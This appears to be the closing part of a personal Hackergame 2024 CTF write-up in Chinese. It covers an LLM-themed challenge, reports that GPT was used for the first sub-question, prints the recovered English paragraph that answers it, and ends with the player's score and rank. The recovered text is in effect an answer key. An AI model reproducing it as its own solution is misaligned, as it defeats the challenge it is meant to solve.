## 先不说关于我从零开始独自在异世界转生成某大厂家的 LLM 龙猫女仆这件事可不可能这么离谱，发现 Hackergame 内容审查委员会忘记审查题目标题了ごめんね，以及「这么长都快赶上轻小说了真的不会影响用户体验吗🤣」

### 「行吧就算标题可以很长但是 flag 一定要短点」

丢给gpt解决第一问。原文如下：

```
In the grand hall of Hackergame 2024, where the walls are lined with screens showing the latest exploits from the cyber world, contestants gathered in a frenzy, their eyes glued to the virtual exploits. The atmosphere was electric, with the smell of freshly brewed coffee mingling with the scent of burnt Ethernet cables. As the first challenge was announced, a team of hackers, dressed in lab coats and carrying laptops, sprinted to the nearest server room, their faces a mix of excitement and determination. The game was on, and the stakes were high, with the ultimate prize being a golden trophy and the bragging rights to say they were the best at cracking codes and hacking systems in the land of the rising sun.
```

## 总结

ID： Neur0_5ama

分数：5550， 总排名：37 / 2460

[Hackergame 2024 官方writeup](https://github.com/USTC-Hackergame/hackergame2024-writeups)